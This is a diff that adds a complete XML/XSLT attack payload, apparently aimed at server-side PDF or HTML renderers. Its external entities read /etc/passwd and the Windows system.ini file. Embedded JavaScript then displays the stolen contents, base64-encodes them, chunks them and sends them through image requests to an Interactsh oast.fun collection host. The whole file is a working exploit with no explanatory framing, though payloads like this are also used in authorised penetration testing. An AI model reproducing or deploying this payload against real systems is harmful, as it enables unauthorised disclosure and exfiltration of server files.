@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="?#"?>
+<!DOCTYPE div [
+  <!ENTITY passwd_p        "file:///etc/passwd">
+  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
+  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
+  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
+]>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+  <xsl:template match="/">
+    <xsl:copy-of select="document('')"/>
+
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <div style="display:none">
+        <p class="&passwd_p;">&passwd_c;</p>
+        <p class="&sysini_p;">&sysini_c;</p>
+      </div>
+
+      <div style="width:40rem" id="r"></div>
+
+      <script><![CDATA[
+        // Render visible proof in PDF
+        document.querySelector('#r').innerHTML = `
+remote web url:
+<textarea style="width:100%;height:1.5rem">${location.href}</textarea><br/><br/>`;
+
+        let exfilData = '';
+
+        document.querySelectorAll('p').forEach(p => {
+          document.querySelector('#r').innerHTML += `
+local file path:
+<textarea style="width:100%;height:1.5rem">${p.className}</textarea><br/>
+local file content:
+<textarea style="width:100%;height:60rem">${p.innerHTML}</textarea><br/><br/>`;
+
+          exfilData += 'PATH:' + p.className + '\n';
+          exfilData += 'DATA:' + p.innerHTML + '\n\n';
+        });
+
+        // UTF-8 safe Base64 encode
+        function b64encode(str) {
+          return btoa(unescape(encodeURIComponent(str))).replace(/=+$/, '');
+        }
+
+        // Chunk data to avoid URL truncation
+        function chunkString(str, size) {
+          const chunks = [];
+          for (let i = 0; i < str.length; i += size) {
+            chunks.push(str.slice(i, i + size));
+          }
+          return chunks;
+        }
+
+        const encoded = b64encode(exfilData);
+        const chunks = chunkString(encoded, 600);
+
+        // Interactsh exfiltration
+        chunks.forEach((chunk, i) => {
+          const img = new Image();
+          img.src =
+            'https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/' +
+            i + '/' + chunk;
+          document.body.appendChild(img);
+        });
+      ]]></script>
+    </body>
+  </xsl:template>
+</xsl:stylesheet>
